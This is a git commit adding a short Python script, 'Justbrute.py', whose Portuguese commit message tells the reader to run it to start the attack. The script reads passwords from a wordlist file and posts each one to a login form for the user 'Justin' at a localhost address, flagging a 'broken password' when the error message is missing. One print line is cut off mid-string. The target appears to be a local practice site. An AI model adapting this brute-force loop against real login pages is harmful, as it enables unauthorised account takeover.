e7b3a3d3108f54655a2cc3501ac87dc2047819aa
justinfausti555 <justinfaustin555@gmail.com>
2024-06-27 22:23:27 +0100

    Create Justbrute.py
    Execute essa ferramenta pra começar o ataque

---
+++ Justbrute.py
@@ -0,0 +1,25 @@
+#!/usr/bin/python3
+
+import requests
+import os
+
+os.system('clear')
+
+with open('password.txt') as file:
+     senhas = file.readlines()
+
+     print('='*24)
+     print('BRUTEFORCE DARKET 1.0')
+     print('='*24)
+
+     for i in senhas:
+         senha = i.strip()
+
+         payload = { "nome" : "Justin", "senha" : senha }
+         url = 'http://localhost:8000/login.php'
+         response = requests.post(url,data=payload)
+
+         if "Usuário ou senha errada!" not in response.text:
+             print('\033[92m[+]- SENHA QUEBRADA ==> ', senha,'\>
+         else:
+             print('\033[91m[+]- ', senha,'\033[0m')
